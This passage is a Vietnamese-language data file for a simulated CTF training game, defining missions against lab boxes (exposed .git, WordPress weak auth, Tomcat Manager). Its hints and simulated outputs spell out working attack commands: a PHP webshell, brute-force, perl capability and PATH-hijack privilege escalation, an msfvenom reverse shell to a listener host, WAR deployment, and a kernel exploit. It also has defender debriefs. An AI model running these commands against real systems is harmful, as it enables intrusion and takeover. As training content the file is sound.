      'Kiểm tra `curl http://10.10.10.75/.git/config`; nếu trả về nội dung thật thì dump cả repo bằng `git-dumper http://10.10.10.75/.git/ ./dump`. Rồi `git log -p` để soi từng commit, không chỉ commit mới nhất.',
      'Secret "xoá" ở commit sau vẫn còn ở commit TRƯỚC — chạy `git log -p | grep DEPLOY_API_KEY` để xác nhận key vẫn đọc được, dùng nó làm password SSH: `ssh deploy@10.10.10.75`. Vào trong, privesc không qua SUID mà qua capability: `getcap -r /` lộ cap_setuid trên perl -> `perl -e \'use POSIX qw(setuid); setuid(0); exec "/bin/bash";\'` -> root, `cat /root/flag.txt` -> FLAG{git_history_leak_apikey_then_capability_privesc}.',
    ],
    terms: [
      { term: '.git exposure', def: 'Lỗi deploy để nguyên thư mục .git trên webroot, lộ toàn bộ lịch sử commit kể cả thứ đã "xoá" ở commit sau.' },
      { term: 'git-dumper', def: 'Công cụ tự động tải lại toàn bộ object Git từ một thư mục .git lộ trên web để dựng lại repo đầy đủ.' },
      { term: 'git log -p (lịch sử)', def: 'Xem nội dung thay đổi của từng commit; secret xoá ở commit mới vẫn đọc được ở commit cũ.' },
      { term: 'Linux capabilities', def: 'Cơ chế cấp quyền hạt mịn hơn SUID (vd cap_setuid chỉ cho phép đổi UID) — getcap -r / liệt kê binary nào có capability bất thường.' },
    ],
    debrief: [
      'Git lưu TOÀN BỘ lịch sử, không chỉ trạng thái hiện tại — "xoá" một dòng ở commit mới không hề xoá nó khỏi commit cũ; secret từng commit một lần là rò rỉ vĩnh viễn trừ khi rewrite lịch sử (và đổi luôn secret đó).',
      '.git lộ trên web là lỗi deploy process: hoặc copy nguyên thư mục project (gồm .git) vào webroot, hoặc build script quên loại trừ — một curl đơn giản dump được cả source code và secret.',
      'Capabilities là phiên bản "chia nhỏ" của quyền root: thay vì SUID cho cả binary toàn quyền root, cap_setuid chỉ cho phép gọi setuid() — nhưng với GTFOBins, một capability hẹp như vậy vẫn đủ để spawn shell root hoàn chỉnh.',
      'DEFENDER: KHÔNG BAO GIỜ deploy kèm .git lên production (loại trừ trong build/CI, hoặc deploy bằng git archive/artifact thay vì copy nguyên repo); rotate secret ngay khi nghi bị commit nhầm, dù đã "xoá" ở commit sau; audit `getcap -r /` định kỳ song song với `find -perm -4000` vì capability dễ bị bỏ quên hơn SUID.',
    ],
    initialFilesystem: fsC8M10,
  },
  {
    id: 11,
    chapterId: 8,
    title: 'CTF — Box CMS Weak Auth',
    story:
      'Target 10.10.10.80. Lại một WordPress khác, nhưng lần này lỗ hổng không nằm ở plugin mà ở chính API: REST API lộ username thật, và mật khẩu của tài khoản đó yếu đến mức đoán được. Sau khi có quyền admin wp-admin, mày dùng Theme Editor để chèn code — và bài học privesc lần này là PATH hijack, khác hẳn cron ở box Wordpress đầu tiên.',
    steps: [
      {
        id: 'scan',
        description: 'Scan service, xác nhận WordPress đang chạy',
        match: /^nmap\b/,
        output: ['Starting Nmap 7.94 ( https://nmap.org )', 'Nmap scan report for 10.10.10.80', 'PORT   STATE SERVICE VERSION', '22/tcp open  ssh', '80/tcp open  http    Apache httpd 2.4.51', '|_http-generator: WordPress 5.8.1'].join('\n'),
      },
      {
        id: 'rest_api_leak',
        description: 'Dùng REST API /wp-json/wp/v2/users để lộ username thật',
        match: /wp-json\/wp\/v2\/users|wp\/v2\/users/i,
        output: 'curl http://10.10.10.80/wp-json/wp/v2/users -> [{"id":1,"name":"j.admin","slug":"j-admin"}]  <-- username thật lộ ra, không cần đăng nhập.',
      },
      {
        id: 'brute_password',
        description: 'Brute-force mật khẩu yếu của j.admin (wpscan hoặc thử thủ công)',
        match: /wpscan\b.*--passwords|wpscan\b.*brute|hydra\b.*wp-login/i,
        output: '[SUCCESS] - j.admin / Summer2024!  <-- mật khẩu yếu, brute-force trúng trong wordlist nhỏ.',
      },
      {
        id: 'theme_editor_rce',
        description: 'Đăng nhập wp-admin, dùng Theme Editor chèn PHP vào 404.php',
        match: /theme\s*editor|404\.php|appearance.*editor/i,
        output: "wp-admin/theme-editor.php -> chọn theme active, sửa 404.php, chèn <?php system($_GET['cmd']); ?> -> Update File -> http://10.10.10.80/wp-content/themes/active/404.php?cmd=id -> uid=33(www-data). RCE!",
      },
      {
        id: 'find_path_issue',
        description: 'Đọc cron/script của root xem có gọi lệnh không dùng path tuyệt đối',
        match: /^cat\s+\/etc\/cron\.d\/.*|^cat\s+\S*site-backup/,
      },
      {
        id: 'privesc',
        description: 'PATH hijack: tạo file "backup" giả trong thư mục writable nằm trước trong $PATH',
        match: /export\s+path|path=.*:\$path|chmod\s+\+x.*backup|echo.*\/bin\/bash.*backup/i,
        output: 'Tạo /var/www/html/backup chứa `#!/bin/bash\\ncp /bin/bash /tmp/rb; chmod +s /tmp/rb`, chmod +x. Cron root chạy `cd /var/www/html && backup` -> không path tuyệt đối -> shell tìm theo PATH -> chạy file giả của mày -> /tmp/rb SUID root.',
      },
      { id: 'capture_flag', description: 'Đọc flag ở /root/flag.txt', match: /^cat\s+\/root\/flag\.txt/ },
    ],
    hints: [
      'WordPress REST API đôi khi lộ thông tin mà không cần đăng nhập — thử endpoint liệt kê user. Trước đó `nmap -sV 10.10.10.80` để xác nhận WordPress. Sau khi có quyền admin, để ý cron của root gọi lệnh như thế nào.',
      'Lấy username từ `curl http://10.10.10.80/wp-json/wp/v2/users`. Brute mật khẩu bằng wordlist nhỏ (`wpscan --url ... -U j.admin --passwords small.txt`). Đăng nhập xong, dùng `Theme Editor` sửa `404.php` chèn `system($_GET[\'cmd\'])`.',
      'Sau RCE, `cat /etc/cron.d/site-backup` thấy root chạy lệnh `backup` KHÔNG dùng đường dẫn tuyệt đối trong thư mục mày ghi được — `echo \'#!/bin/bash\\ncp /bin/bash /tmp/rb; chmod +s /tmp/rb\' > /var/www/html/backup && chmod +x /var/www/html/backup`, đợi cron, rồi `/tmp/rb -p`, `cat /root/flag.txt` -> FLAG{wp_weak_password_theme_editor_then_path_hijack}.',
    ],
    terms: [
      { term: 'WP REST API leak', def: 'Endpoint /wp-json/wp/v2/users của WordPress lộ username thật mà không cần xác thực — tiền đề cho brute-force.' },
      { term: 'Theme/Plugin Editor RCE', def: 'wp-admin cho phép admin sửa trực tiếp file PHP của theme/plugin — chèn webshell vào đây là RCE tức thì.' },
      { term: 'PATH hijack', def: 'Khi script chạy một lệnh không kèm đường dẫn tuyệt đối, shell tìm theo thứ tự $PATH — tạo file giả cùng tên ở thư mục ưu tiên hơn để bị gọi nhầm.' },
      { term: '$PATH', def: 'Biến môi trường chứa danh sách thư mục shell sẽ tìm lệnh theo thứ tự; thư mục đứng trước được ưu tiên.' },
    ],
    debrief: [
      'REST API hiện đại thường lộ nhiều hơn admin tưởng: endpoint /users tồn tại để phục vụ tính năng (hiển thị tác giả bài viết) nhưng vô tình trở thành nguồn liệt kê username miễn phí cho attacker.',
      'Theme/Plugin Editor là tính năng admin hợp pháp — nhưng MỘT KHI đã chiếm được tài khoản admin, đây là con đường RCE ngắn nhất, ngắn hơn cả tìm exploit plugin.',
      'PATH hijack khai thác một lỗi lập trình kinh điển: gọi lệnh theo tên ngắn (backup) thay vì đường dẫn tuyệt đối (/usr/local/bin/backup) — nếu thư mục hiện tại hoặc một dir writable nằm trước trong PATH của script, attacker chèn được binary giả.',
      'DEFENDER: ẩn/giới hạn REST API endpoint /users (plugin như "Disable REST API" hoặc filter permission_callback); luôn dùng mật khẩu mạnh + 2FA cho admin WordPress, giới hạn brute-force bằng rate-limit; viết script root LUÔN dùng đường dẫn tuyệt đối và set PATH cố định ở đầu script, không tin vào PATH kế thừa từ môi trường gọi.',
    ],
    initialFilesystem: fsC8M11,
  },
  {
    id: 12,
    chapterId: 8,
    title: 'CTF — Box Tomcat Kernel',
    story:
      'Bài hard cuối cùng, gần như không hint. Target 10.10.10.90, black-box hoàn toàn. Cổng phổ biến chưa chắc là cửa vào — quét hết port trước. Bên trong là Apache Tomcat với Manager UI dùng credential yếu, cho phép deploy WAR tuỳ ý thành RCE. Nhưng đó chỉ là cờ đầu tiên — máy này còn chạy một kernel cũ dính CVE, và cờ thứ hai chỉ lộ ra sau khi mày tự build exploit kernel.',
    steps: [
      {
        id: 'fullscan',
        description: 'Full port scan (-p-) — đừng tin port phổ biến là tất cả',
        match: /^nmap\b.*-p-|^nmap\b/,
        output: ['Nmap scan report for 10.10.10.90', 'PORT      STATE SERVICE', '22/tcp    open  ssh', '8080/tcp  open  http     (Apache Tomcat/Coyote JSP engine)', '(không có port 80 — service chính nằm ở 8080)'].join('\n'),
      },
      {
        id: 'find_manager',
        description: 'Tìm trang Tomcat Manager và thử credential yếu',
        match: /\/manager\/html|tomcat[- ]?users|admin.*tomcat/i,
        output: 'http://10.10.10.90:8080/manager/html -> 401, thử admin:tomcat123 -> 200 OK. Logged into Tomcat Manager.',
      },
      {
        id: 'build_war',
        description: 'Đóng gói webshell thành file WAR để deploy',
        match: /msfvenom\b.*war|jar\s+-cvf.*\.war|\.war\b/i,
        output: 'msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f war -o shell.war -> shell.war (2.1KB) ready to deploy.',
      },
      {
        id: 'deploy_war',
        description: 'Deploy WAR qua Manager API để có RCE',
        match: /curl\b.*\/manager\/text\/deploy|deploy.*shell\.war/i,
        output: 'curl --upload-file shell.war "http://admin:tomcat123@10.10.10.90:8080/manager/text/deploy?path=/shell" -> OK - Deployed application at context path [/shell]. GET /shell/ -> reverse shell catches -> uid=1000(tomcat).',
      },
      {
        id: 'read_user_flag',
        description: 'Đọc cờ user (user.txt)',
        match: /^cat\s+.*user\.txt/,
      },
      {
        id: 'check_kernel',
        description: 'Kiểm tra version kernel để tìm CVE leo quyền',
        match: /^uname\s+-[ar]|^cat\s+\/proc\/version/,
      },
      {
        id: 'kernel_exploit',
        description: 'Build và chạy kernel exploit tương ứng để thành root',
        match: /searchsploit|gcc\b.*exploit|cve-2017-16995|ebpf/i,
        output: 'searchsploit linux kernel 4.4.0 -> CVE-2017-16995 (eBPF privesc). gcc 44298.c -o exploit && ./exploit -> uid=0(root). Kernel exploit thành công.',
      },
      { id: 'read_root_flag', description: 'Đọc cờ root (root.txt)', match: /^cat\s+\/root\/root\.txt/ },
    ],
    hints: [
      'Bài hard, hint tối thiểu. Port web chính chưa chắc là 80/443. Sau khi có shell quyền thấp, đừng dừng ở đó — luôn kiểm tra version kernel. Bắt đầu bằng `nmap -p- 10.10.10.90`.',
      'Full scan ra Tomcat ở 8080. Thử `/manager/html` với credential mặc định/yếu — admin:tomcat123. Tomcat Manager cho phép deploy file .war trực tiếp thành ứng dụng chạy được trên server: `msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f war -o shell.war`.',
      'Deploy qua API: `curl --upload-file shell.war "http://admin:tomcat123@10.10.10.90:8080/manager/text/deploy?path=/shell"` -> RCE user tomcat -> `cat /home/tomcat/user.txt`. Rồi `uname -a` lộ kernel 4.4.0-116, tra `searchsploit` ra CVE-2017-16995, compile và chạy exploit -> root -> `cat /root/root.txt` -> FLAG{kernel_cve_2017_16995_ebpf_privesc_root}.',
    ],
    terms: [
      { term: 'Tomcat Manager', def: 'Trang quản trị web của Apache Tomcat, cho phép deploy/undeploy ứng dụng .war — nếu credential yếu thì biến thành RCE.' },
      { term: 'WAR deployment RCE', def: 'Đóng gói webshell thành file .war hợp lệ rồi deploy qua Manager để Tomcat tự chạy nó như một ứng dụng Java thật.' },
      { term: 'Kernel exploit', def: 'Mã khai thác lỗ hổng trong chính nhân Linux (kernel) — thường cho privesc trực tiếp lên root bất kể cấu hình userspace.' },
      { term: 'searchsploit', def: 'Công cụ tra cứu offline cơ sở dữ liệu Exploit-DB theo từ khoá (tên phần mềm, version, CVE).' },
    ],
    debrief: [
      'Black-box buộc mày quét HẾT port — nếu chỉ check 80/443 sẽ bỏ sót toàn bộ service chính chạy ở port khác (8080 ở đây), một sai lầm enum kinh điển.',
      'Tomcat Manager với credential yếu/mặc định là một trong những RCE "miễn phí" lâu đời nhất trong pentest: tính năng deploy WAR vốn dành cho devops, nhưng không có gì ngăn một webshell đóng vai một ứng dụng Java hợp lệ.',
      'Kernel exploit là tầng privesc "cuối cùng" khi không còn SUID/sudo/cron nào để lợi dụng — một kernel cũ chưa patch là lỗ hổng nằm NGOÀI tầm kiểm soát của admin ứng dụng, chỉ sysadmin patch OS mới vá được.',
      'DEFENDER: đổi/xoá credential mặc định của mọi management UI (Tomcat, Jenkins, phpMyAdmin...) ngay khi cài; giới hạn /manager chỉ truy cập từ IP nội bộ/VPN; patch kernel định kỳ — một kernel 4.4.0 chạy production nhiều năm không update là tự mở cửa cho mọi CVE đã công khai exploit.',
    ],
    initialFilesystem: fsC8M12,
  },
];
